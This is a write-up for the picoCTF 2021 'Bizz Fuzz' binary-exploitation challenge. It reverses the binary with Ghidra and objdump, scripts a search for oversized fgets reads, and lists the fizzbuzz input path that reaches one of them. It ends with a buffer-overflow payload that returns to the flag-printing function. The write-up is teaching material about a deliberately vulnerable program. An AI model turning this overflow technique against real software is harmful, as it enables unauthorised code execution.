# Bizz Fuzz

picoCTF 2021 - Binary Exploitation - 500 points

> FizzBuzz was too easy, so I made something a little bit harder... There's a buffer overflow in this problem, good luck finding it!
>
> Hints:
>
> - What functions are imported? Where are they used? And what do these strings mean?
> - Woah, some of these functions seem similar, can you figure them out one group at a time?
> - If fancy new dissassemblers take too long, there's always objdump!
> - Have you heard of binary instrumentation before? It might keep you from running in circles. No promises.
> - ANGR is another great framework.

Provided file: `vuln`

Prerequisite topics: Basic buffer overflow, [Reversing Basics](https://github.com/beepboop271/ctf-writeups-solutions/tree/master/general%20resources/rev%20and%20pwn/rev-basics.md)

Before starting I would just like to mention that if you wanted to learn about the stuff referenced in the last two hints, this is not the place for you - I solved the program with Ghidra, `objdump`, and plain Python (well, with `pwntools`). I also don't think this challenge was worth 500 points, but whatever. Side note two, this is almost entirely a reversing challenge.

## Investigation

Opening the program in Ghidra, we navigate to the main function<sup id="a1">[1](#f1)</sup>:

```c
setbuf(stdout, (char *)0x0);
FUN_0811d5b3();
FUN_0811d941();
puts("fizz");
FUN_0811ead2();
puts("buzz");
puts("fizz");
FUN_0811fbb3();
FUN_08120828();
puts("fizz");
puts("buzz");
FUN_08121d33();
puts("fizz");
FUN_08122908();
FUN_08122ea8();
puts("fizzbuzz");
FUN_081237e9();
FUN_081241ca();
puts("fizz");
FUN_081255ef();
...
```

Navigating inside each of the functions here, we find something similar to this in all of them:

```c
int iVar1;
FUN_0814c6ca();
iVar1 = FUN_080486b1(4);
if (iVar1 != 4) {
  FUN_081451af();
  iVar1 = FUN_080486b1(4);
  if (iVar1 != 4) {
    FUN_0812d430();
    iVar1 = FUN_080486b1(10);
    if (iVar1 != 10) {
      FUN_0812d430();
      iVar1 = FUN_080486b1(7);
      if (iVar1 != 7) {
        FUN_08140c2e();
        iVar1 = FUN_080486b1(0x11);
        if (iVar1 != 0x11) {
          FUN_0811d5b3();
          iVar1 = FUN_080486b1(2);
          if (iVar1 != 2) {
            FUN_0813e2a2();
            iVar1 = FUN_080486b1(0xe);
            ...
```

Notice that there is one function being called repeatedly, `FUN_080486b1`. Cleaning it up a little (and giving it a name), we get:

```c
uint do_fizzbuzz(uint limit) {
  char input[9];
  uint i = 1;

  while (true) {
    while (true) {
      while (true) {
        if (i >= limit) {
          return i;
        }
        printf("%zu? ", i);
        scanf("%9s", input);
        if (i % 15 != 0) break;
        if (strncmp(input, "fizzbuzz", 8) != 0) {
          return i;
        }
        ++i;
      }
      if (i % 3 == 0) break;
      if (i == (i / 5) * 5) {
        if (strncmp(input, "buzz", 8) != 0) {
          return i;
        }
        ++i;
      } else {
        if (i != strtol(input, NULL, 10)) {
          return i;
        }
        ++i;
      }
    }
    if (strncmp(input, "fizz", 8) != 0) break;
    ++i;
  }
  return i;
}
```

Basically, this function interacts with the user to play fizzbuzz<sup id="a2">[2](#f2)</sup>, up to a certain limit. The function returns which number the user successfully played until. For example, running `do_fizzbuzz(5)` with the following IO would return `5`, because the user successfully played until the 5th round:

```text
1? 1
2? 2
3? fizz
4? 4
```

However, the input of `1`, `2`, `3` would return `3`, because the user got to three but failed it.

Returning back to the `big nested if` functions, we can see that the `do_fizzbuzz` function is called many times with various values of the limit, and we explore a bit to see what other functions are called. It turns out that each `big nested if` function calls many other `big nested if` functions (sometimes even recursively, making infinite loops). However, if we keep clicking we will eventually finding a function which looks something like this:

```c
void FUN_081004e9(void) {
  char local_6a [90];
  int local_10;

  local_10 = do_fizzbuzz(0x4f);
  if (local_10 == 1) {
    fgets(local_6a, 0x30, stdin);
  }
  if (local_10 == 2) {
    fgets(local_6a, 0x20, stdin);
  }
  if (local_10 != 3) {
    if (local_10 == 4) {
      fgets(local_6a, 0xe, stdin);
    }
    if ((local_10 != 5) && (local_10 != 6)) {
      if (local_10 == 7) {
        fgets(local_6a, 0x29, stdin);
      }
      if (local_10 == 8) {
        fgets(local_6a, 0x42, stdin);
      }
      if ((local_10 != 9) && (local_10 != 10)) {
        if (local_10 == 0xb) {
          fgets(local_6a, 0x38, stdin);
        }
        ...
```

This sounds like what the problem was referring to:

> There's a buffer overflow in this problem, good luck finding it!

`fgets` *could* overflow the buffer declared in this function if the number of characters to read (the second argument) was greater than the size of the buffer. Checking the Symbol Tree in Ghidra, we can see there are *hundreds* of functions of both the `big nested if` and `big fgets if` type. However, just by clicking into some functions randomly, we can see that all the `big fgets if` functions are located near the start of the binary (the first one starts after `do_fizzbuzz`, at `0x0804883a`). But, before we continue with the fgets functions, we will do some more exploration.

If we search for strings in Ghidra (Search > For Strings...) and use the default settings, we can see there is a string called `"flag.txt"` at `0x0814c752`. Clicking on that row, Ghidra takes us to the part in the binary where it is located and helpfully tells us where this string is referenced elsewhere in the program:

```text
                    DAT_0814c752         XREF[2]: FUN_08048656:08048672(*),
                                                  FUN_08048656:08048678(*)
0814c752 66 6c 61   ds "flag.txt"
         67 2e 74
         78 74 00
```

Clicking on the addresses next to `XREF` to jump to them, we see:

```c
void FUN_08048656(void) {
  char local_74 [100];
  FILE *local_10;

  local_10 = fopen("flag.txt", "r");
  fgets(local_74, 100, local_10);
  puts(local_74);
  exit(0);
}
```

This looks like the win function<sup id="a3">[3](#f3)</sup>. Checking the references for the function, we see the address to it is put on the stack in main, but nothing is ever done with that. Thus, the goal of this challenge is probably:

- Find a buffer overflow in the program
- Find a sequence of fizzbuzz inputs to navigate to the overflow
- Overflow the buffer, returning to the win function

Elaborating a bit more on the second point, in case it wasn't really clear, the `big fgets if` functions (which contain the buffer overflows) are all called from various `big nested if` functions. However, if you remember, each `big nested if` function looks like this:

```c
if (do_fizzbuzz(4) != 4) {
  random_fun_1();
  if (do_fizzbuzz(4) != 4) {
    random_fun_2();
    if (do_fizzbuzz(10) != 10) {
      random_fun_3();
      if (do_fizzbuzz(7) != 7) {
        random_fun_4();
        if (do_fizzbuzz(0x11) != 0x11) {
          target();
          if (do_fizzbuzz(2) != 2) {
            random_fun_5();
            ...
```

So suppose that each `random_fun` is a `big nested if` function, and suppose that `target` was a `big fgets if` function that contained the overflow. That means to get to it, we would need to:

- Intentionally fail the first fizzbuzz for 4 (because we need to *avoid* 4 (`!= 4`) to continue down the if-chain)
- Successfully complete the first fizzbuzz in `random_fun_1` to fail the if and return out of the function (or else it would just be another big chain of ifs that lead to nowhere)
- Intentionally fail the fizzbuzz for 4
- Successfully complete the first fizzbuzz in `random_fun_2`
- Intentionally fail the fizzbuzz for 10
- Successfully complete the first fizzbuzz in `random_fun_3`
- Intentionally fail the fizzbuzz for 7
- Successfully complete the first fizzbuzz in `random_fun_4`
- Intentionally fail the fizzbuzz for 17
- Now executing code inside `target`

Successfully fizzbuzz-ing just involves generating fizzbuzz as a string, and intentionally failing just means printing `0` to immediately return (because the first input should be `1`).

Inside the `big fgets if` function, we can see it's basically just a really messy switch statement or if-else-if chain, something like:

```c
void FUN_0804883a(void) {
  char local_42 [50];
  int local_10;

  local_10 = do_fizzbuzz(0x21);
  if (local_10 == 1) {
    fgets(local_42,0x28,stdin);
  }
  if (local_10 == 2) {
    fgets(local_42,0x10,stdin);
  }
  if (local_10 == 4) {
    fgets(local_42,0x27,stdin);
  }
  if (local_10 == 7) {
    fgets(local_42,0x24,stdin);
  }
  if (local_10 == 8) {
    fgets(local_42,8,stdin);
  }
  if (local_10 == 0xb) {
    fgets(local_42,0x10,stdin);
  }
  if (local_10 == 0xd) {
    fgets(local_42,0x31,stdin);
  }
  ...
```

So to call the `fgets` that overflows the buffer we just need to fail the fizzbuzz at the right value.

## Finding the Buffer Overflow

It would be pretty straightforward if we could programatically search the disassembly, but I'm not aware of any way to do that (I'm sure there is). However, it takes a bit of time to disassemble each function and there are hundreds of functions, so there wouldn't be much point to it when we can just search the assembly.

This is a 32-bit program, so parameters for `fgets` are passed on the stack. Let's `objdump -M intel -d vuln`

```x86asm
; function prologue
804883a:    55                   push    ebp
804883b:    89 e5                mov     ebp,esp
804883d:    53                   push    ebx
; reserve space for the buffer
804883e:    83 ec 44             sub     esp,0x44

8048841:    e8 4a fd ff ff       call    8048590 <__gmon_start__@plt+0x60>
8048846:    81 c3 ba d7 10 00    add     ebx,0x10d7ba

; call do_fizzbuzz(0x21) and set to local variable
804884c:    83 ec 0c             sub     esp,0xc
804884f:    6a 21                push    0x21
8048851:    e8 5b fe ff ff       call    80486b1 <__gmon_start__@plt+0x181>
8048856:    83 c4 10             add     esp,0x10
8048859:    89 45 f4             mov     DWORD PTR [ebp-0xc],eax

804885c:    83 7d f4 01          cmp     DWORD PTR [ebp-0xc],0x1
8048860:    75 1a                jne     804887c <__gmon_start__@plt+0x34c>

; start fgets call
; push stdin file (argument 3)
8048862:    8b 83 f8 ff ff ff    mov     eax,DWORD PTR [ebx-0x8]
8048868:    8b 00                mov     eax,DWORD PTR [eax]
804886a:    83 ec 04             sub     esp,0x4
804886d:    50                   push    eax
; push 0x28 (number of bytes to read) (argument 2)
804886e:    6a 28                push    0x28
; push the address of the buffer (argument 1)
; (stack address that could overflow!)
8048870:    8d 45 c2             lea     eax,[ebp-0x3e]
8048873:    50                   push    eax
; call fgets
8048874:    e8 27 fc ff ff       call    80484a0 <fgets@plt>
8048879:    83 c4 10             add     esp,0x10

804887c:    83 7d f4 02          cmp     DWORD PTR [ebp-0xc],0x2
8048880:    75 1a                jne     804889c <__gmon_start__@plt+0x36c>

; start different fgets call
8048882:    8b 83 f8 ff ff ff    mov     eax,DWORD PTR [ebx-0x8]
8048888:    8b 00                mov     eax,DWORD PTR [eax]
804888a:    83 ec 04             sub     esp,0x4
804888d:    50                   push    eax
; this one reads 0x10 bytes
804888e:    6a 10                push    0x10
8048890:    8d 45 c2             lea     eax,[ebp-0x3e]
8048893:    50                   push    eax
8048894:    e8 07 fc ff ff       call    80484a0 <fgets@plt>

; many other fgets calls omitted

; function epilogue
8048b52:    8b 5d fc             mov     ebx,DWORD PTR [ebp-0x4]
8048b55:    c9                   leave
8048b56:    c3                   ret

; prologue of next function
8048b57:    55                   push    ebp
8048b58:    89 e5                mov     ebp,esp
8048b5a:    53                   push    ebx
8048b5b:    83 ec 44             sub     esp,0x44
```

So, I don't know about you, but the *obvious* solution for me is to ignore the hints about ANGR and instrumentation, and pipe this `objdump` into a file for some string processing! As mentioned, the first `big fgets if` function starts at `0x0804883a` and the last one returns at `0x0811d5b2`, so delete everything outside those addresses. Then, we'll just write a quick script that:

- Finds a `ret` instruction
- Finds the next `sub` and records it as the current function's stack size
- Finds a `call` instruction for `fgets`, and finds the `push` instruction on the third line before the call
- Compares the `fgets` argument with the stack size, recording it if it is larger (an overflow)

```py
import collections

# the file containing the cropped objdump
with open("findoverflow", "r") as f:
    lines = collections.deque(f)

stack_size = 0

# buffer of 4 lines so that when we hit the fgets call we can
# easily find the pushed argument for number of bytes to read
# 3 lines back
buf = collections.deque()
buf.append("")
buf.append("")
buf.append("")
buf.append("")

max_overflow = (0, "")

for line in lines:
    buf.popleft()
    buf.append(line)
    if line.endswith("ret"):
        # new function, reset
        stack_size = 0
    elif stack_size == 0 and "sub" in line:
        # record new function's stack size
        stack_size = int(line[-2:], 16)
    elif "fgets" in line:
        # possible overflow
        read_len = int(buf[0].rsplit(maxsplit=1)[1], 16)
        delta = read_len - stack_size
        if delta >= max_overflow[0]:
            max_overflow = (delta, line)

print(max_overflow)
```

This prints out:

```text
(344, ' 808aeb0:\te8 eb d5 fb ff       \tcall   80484a0 <fgets@plt>\n')
```

Looks like we found an overflow of about 340 bytes (much more than enough). Note: looks like there are actually *a lot* of buffer overflows, I just picked the biggest one. There might be one that has a shorter path (next section), who knows.

## Finding the FizzBuzz Path

Going to the address printed above, `0x0808aeb0`, we can open the Function Call Trees window in Ghidra to see what functions call the function containing our target overflow. We just need to find a path of functions that eventually leads to `main`. I wanted to find a reasonably short path ~~because I did the next part manually and it is annoying~~, so I had to look a little bit. Note that the fewest number of calls does not necessarily mean the shortest path because some functions call the next one very deep in the nested if. However, it really does not matter what path of functions you choose.

In the end, I chose this path of calls (for not much particular reason other than the fact that it felt short at the very late time I did this challenge):

- `main`
- `FUN_08127c08`
- `FUN_0812c368`
- `FUN_08138931`
- `FUN_0813dd86`
- `FUN_0813ca30`
- `FUN_08143ffd`
- `FUN_081313b8`
- `FUN_08109f08`
- `FUN_0808ae73` (contains overflow)

Then, I manually just created a list of operations that needed to happen. Remember this:

> - Intentionally fail the first fizzbuzz for 4 (because we need to *avoid* 4 to continue down the if-chain)
> - Successfully complete the first fizzbuzz in `random_fun_1` to fail the if and return out of the function (or else it would just be another big chain of ifs that lead to nowhere)
> - Intentionally fail the fizzbuzz for 4
> - Successfully complete the first fizzbuzz in `random_fun_2`
> - Intentionally fail the fizzbuzz for 10
> - Successfully complete the first fizzbuzz in `random_fun_3`
> - Intentionally fail the fizzbuzz for 7
> - Successfully complete the first fizzbuzz in `random_fun_4`
> - Intentionally fail the fizzbuzz for 17
> - Now executing code inside `target`

So yeah, I spent probably half an hour (? really no clue, it was late) clicking into functions to see what value is needed for the "complete the first fizzbuzz to fail the if and return out of the function" part.

```py
ops = [
    "4 =", "7 =", "2 =", "9 =", "12 =", "3 =", "12 =", "4 =",
    "7 =", "13 =", "12 =", "18 =", "15 !", "14 !", "17 !",
    "5 !", "11 !", "7 =", "10 !", "13 =", "18 !", "15 =",
    "17 !", "7 =", "8 !", "7 =", "4 !", "16 =", "13 !", "16 =",
    "14 !", "10 =", "13 !", "17 !", "2 =", "5 !", "6 !", "3 =",
    "15 !", "17 =", "18 !", "13 =", "18 !", "5 =", "11 !",
    "7 =", "13 !", "3 =", "9 !", "7 =", "18 !", "7 =", "6 !",
    "6 =", "2 !", "4 =", "8 !", "12 =", "6 !", "13 =", "4 !",
    "5 =", "18 !", "7 =", "4 !", "13 =", "12 !", "2 =", "17 !",
    "12 =", "15 !", "11 =", "16 !", "9 =", "4 !", "14 =",
    "7 !", "4 =", "7 !", "5 =", "2 !"
]

# additional end ops:
# do_fizzbuzz(0x2e) == 5
# do_fizzbuzz(0x14) == 1
```

Each `=` string means we want to create a fizzbuzz input for `do_fizzbuzz` that goes up to that value, so that we can fail the if statement to leave the function. Each `!` string means we want to print `0` so that we can fail the `do_fizzbuzz` to pass the if statement (remember it uses `do_fizzbuzz(x) != x`). The strings in `ops` successfully navigate the various `big nested if` statements. There are also two `do_fizzbuzz` calls we need to deal with that are in `big fgets if` functions.

We'll write a quick fizzbuzz function to generate the inputs for the `=` operations:

```py
def fizzbuzz(n):
    s = []
    for i in range(1, n):
        if i % 15 == 0:
            s.append("fizzbuzz")
        elif i % 3 == 0:
            s.append("fizz")
        elif i % 5 == 0:
            s.append("buzz")
        else:
            s.append(str(i))
    return "\n".join(s)
```

Putting it all together:

```py
for op in ops:
    n, o = op.split()

    if o == "!":
        print("0")
    else:
        print(fizzbuzz(int(n)))

# additional end ops:
# do_fizzbuzz(0x2e) == 5
print(fizzbuzz(5))  # to complete 1-4
print(0)  # to fail early on 5

# do_fizzbuzz(0x14) == 1
# use " " and not "\n" because scanf does not consume trailing
# whitespace, so the fgets would pick up the "\n" and exit.
print("0" + " " + "A"*86 + "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK")
```

## What? This Isn't a Reversing Problem?

Run the Python to get the output, pipe it into a file or copy it to your clipboard, run the program in gdb, find the offset (at `"FFFF"`), win.

```py
padding = b"A"*86 + b"BBBBCCCCDDDDEEEE"
# literally just the address of the win function
address = p32(0x08048656)

# this replaces the last print line
win = b"0 " + padding + address
```

~~Ever seen a 500 point buffer overflow with no ASLR?~~

---

<b id="f1">1</b> There are no symbols, so to find the `main` function we need to find the `entry` function and go to the function specified within `__libc_start_main(...)` [↩](#a1)

<b id="f2">2</b> The rules of fizzbuzz, in case you don't know: you count up starting from 1. However, if the number is a multiple of 3, you say "fizz" instead of the number. You say "buzz" if it is a multiple of 5, and then "fizzbuzz" if it is a multiple of both. [↩](#a2)

<b id="f3">3</b> Alternatively, we could have found this function by just scrolling up from `do_fizzbuzz` because it's right above it in the executable. [↩](#a3)
